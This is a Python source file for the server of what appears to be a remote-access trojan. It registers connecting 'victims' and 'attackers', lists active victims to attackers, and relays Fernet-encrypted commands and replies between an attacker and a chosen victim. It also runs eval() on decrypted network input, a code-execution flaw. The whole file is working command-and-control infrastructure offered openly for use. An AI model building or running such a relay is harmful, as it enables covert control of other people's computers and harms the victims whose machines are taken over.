import threading
from datetime import datetime

from .setting import *
from cryptography.fernet import Fernet
import socket
from .STATUS_CODE import *


def log(*msges):
    msg = ""
    for m in msges:
        msg += str(m) + ' '
    msg = "[*] {} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + msg
    print(msg)
    with open(LOG_FILE_SERVER, 'a') as f:
        f.write(msg + '\n')


class MyQueue:
    def __init__(self):
        self.queue = []

    def add(self, item):
        self.queue.append(item)

    def remove(self, index):
        self.queue.pop(index)

    def get_queue(self):
        return self.queue

    def is_active(self, connection, address):
        try:
            connection.send(b"Ok")
            connection.recv(BufferSize)
            return True
        except Exception as e:
            log("Victim {} was Disconnected".format(address))
            return False

    def checkActiveVictim(self):
        remove = []
        for index, victim in self.queue:
            if self.is_active(victim[0], victim[1]) == False:
                remove.append(index)
                log("Victim {} is not active".format(victim[1]))
        for index in remove:
            self.remove(index)

    def get_size(self):
        return len(self.queue)

    def RmvAddress(self, address):
        for index, victim in enumerate(self.queue):
            if victim[1] == address:
                self.queue.pop(index)
                return True


class Server:
    def __init__(self):
        self.ip = ip
        self.port = port
        self.Address = (self.ip, self.port)
        self.fernet = Fernet(ENCRYPTION_KEY)
        self.victimQueue = MyQueue()
        self.AttackerQueue = MyQueue()
        self.BufferSize = BufferSize
        self.Socket = None
        self.RID = 0

    def SocketMaking(self):
        try:
            self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            return True
        except socket.error as msg:
            log("Error at SocketMaking :: \n", msg)

    def Binding(self):

        try:
            log("Binding to port = ", self.port)
            self.Socket.bind(self.Address)
        except socket.error as msg:
            log("Fail to Bind \ntrying again....")
            log(msg)

    def HandleConnection(self, conn, address):
        try:
            MSG = self.decryptMsg(conn.recv(self.BufferSize))
            if MSG['CODE'] == VICTIM_CODE:
                self.sendMsg(conn, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Connected", CODE=VICTIM_CODE))
                self.victimQueue.add((conn, address))
                log("Victim {} is connected".format(address))
            elif MSG['CODE'] == ATTACKER_CODE:
                self.sendMsg(conn, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Connected", CODE=ATTACKER_CODE))
                self.LisntentoAttacker((conn, address))
        except Exception as msg:
            log("Error at HandleConnection :: ", msg)

    def decryptMsg(self, msg):
        msg = self.fernet.decrypt(msg)
        msg = msg.decode('utf-8')
        return eval(msg)

    def sendMsg(self, conn, msg):
        msg = str(msg).encode('utf-8')
        msg = self.fernet.encrypt(msg)
        conn.send(msg)

    def LisntentoAttacker(self, data):
        conn, address = data
        while True:
            try:
                MSG = self.decryptMsg(conn.recv(self.BufferSize))
                if MSG["status"] == LIST_OF_VICTIMS:
                    self.victimQueue.checkActiveVictim()
                    VIP = str([address[1] for address in self.victimQueue.get_queue()])
                    self.sendMsg(conn, MSG_TEMPLATE(status=LIST_OF_VICTIMS, msg=VIP, CODE=ATTACKER_CODE))
                elif MSG["status"] == MAKE_CONNECTION_TO_VICTIM:
                    self.victimQueue.checkActiveVictim()
                    MSG = MSG["msg"]
                    flag = False
                    for victim in self.victimQueue.get_queue():
                        if victim[1] == MSG:
                            flag = True
                            self.RoomHandler([data,victim])
                            break
                    if flag == False:
                        self.sendMsg(conn, MSG_TEMPLATE(status=CONNECTION_REFUSED, msg="Connection Refused", CODE=ATTACKER_CODE))
                        continue
                    else:
                        continue
                else:
                    self.sendMsg(conn,
                                 MSG_TEMPLATE(status=BAD_REQUEST, msg="BAD_REQUEST", CODE=ATTACKER_CODE))


            except Exception as msg:
                log("Error at LisntentoAttacker :: ", msg)
                self.AttackerQueue.RmvAddress(address)
                return

    def Start(self):
        self.Socket.listen()
        log(f"Server is listening on {self.ip}")
        while True:
            conn, address = self.Socket.accept()
            log(f"NEW CONNECTION FROM {address}")
            threading.Thread(target=self.HandleConnection, args=(conn, address)).start()

    def RoomHandler(self, data):
        AttackerConn = data[0][0]
        VICTIMConn = data[1][0]
        self.sendMsg(AttackerConn, MSG_TEMPLATE(status=CONNECTION_ESTABLISHED, msg="CONNECTION_ESTABLISHED", CODE=ATTACKER_CODE))
        while True:
            try:
                MSG = AttackerConn.recv(self.BufferSize)
            except Exception as msg:
                log("Error at RoomHandler Attacker side :: ", msg)
                self.victimQueue.add(data[1])
                return
            Copy_MSg = self.decryptMsg(MSG)["status"]
            if Copy_MSg == BREAK_CONNECTION_FROM_VICTIM:
                self.victimQueue.add(data[1])
                return
            else:
                try:
                    VICTIMConn.send(MSG)
                except Exception as msg:
                    log("Error at RoomHandler VICTIM Side :: ", msg ,VICTIMConn[1])
                    try:
                        self.sendMsg(AttackerConn,MSG_TEMPLATE(status=VICTIM_DISCONNECTED, msg="VICTIM_DISCONNECTED", CODE=ATTACKER_CODE))

                        return
                    except Exception as msg:
                        log("Error at RoomHandler Attacker Side :: ", msg)
                        return
                try:
                    VMS= VICTIMConn.recv(self.BufferSize)
                except Exception as msg:
                    log("Error at RoomHandler VICTIM Side :: ", msg)
                    try:
                        self.sendMsg(AttackerConn,MSG_TEMPLATE(status=VICTIM_DISCONNECTED, msg="dis", CODE=ATTACKER_CODE))
                        return
                    except Exception as msg:
                        log("Error at RoomHandler Attacker Side :: ", msg)
                        return
                try:
                    AttackerConn.send(VMS)
                except Exception as msg:
                    log("Error at RoomHandler Attacker Side :: ", msg)
                    return
